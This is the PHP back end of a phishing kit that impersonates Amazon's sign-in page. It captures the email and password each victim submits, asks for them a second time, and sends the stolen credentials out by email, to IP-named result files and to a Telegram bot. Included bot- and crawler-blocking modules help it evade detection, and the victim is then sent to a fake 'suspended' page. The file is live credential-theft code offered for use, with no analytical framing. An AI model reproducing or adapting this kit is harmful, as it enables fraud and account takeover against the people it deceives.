<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include 'autob/bts2.php';
include "req/config.php";

$ip = $_SERVER['REMOTE_ADDR'];$user = $_POST['email'];$password = $_POST['password'];


if(isset($_POST['btnsubmit']) && isset($_POST['email']) && isset($_POST['password'])){
    if(strlen($password) >5 && strlen($user) > 3){
		
	///////////////////////// MAIL PART //////////////////////
	if(preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($user))){
		$_SESSION['emailcha'] = $user;};
	
        $user        = $_POST['email'];
        $password     = $_POST['password'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET[''.$theerrkey.''])){$reshead="---------------- CONFIRM AMAZON LOG ----------------";}
		else{$reshead="------------------- NEW AMAZON LOG ----------------- ";};
        $Info_LOG = "
|--===-====-===-- $resultheading --===-====-===--|
$reshead
UserName         : $user 
Password         : $password ";
		if(isset($_GET[''.$theerrkey.''])){$_SESSION['fullz'].=$Info_LOG;} else{$_SESSION['fullz']=$Info_LOG;} 
$Info_LOG.="
".$_SESSION['device'];


// Don't Touche
//Email
        if ($Send_Email == 1) {
			$i = isset($_GET[''.$theerrkey.''])?'(2)':'(1)';
            $subject = $PublicIP.' 💥 '.$i.' AMAZON LOGIN';$headers = 'From: YoCHI <yochmnet@yochzon.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		
		if(!isset($_GET[''.$theerrkey.'']) && $doubleloginentry==1){header("location:signinc?accr".$theerrkey."XId=c".md5(rand(100, 999999999))."15&".$theerrkey."=On");}
		else{header("location:suspended?id=myaccount&y=".md5(rand(100, 999999999))."");};

    }
    else{
		header("location:signinc?".$theerrkey."=c".md5(rand(100, 999999999))."");
    };
}
else{
	header("location:signinc?".$theerrkey."=c3Fauth".md5(rand(100, 999999999))."");
};
?>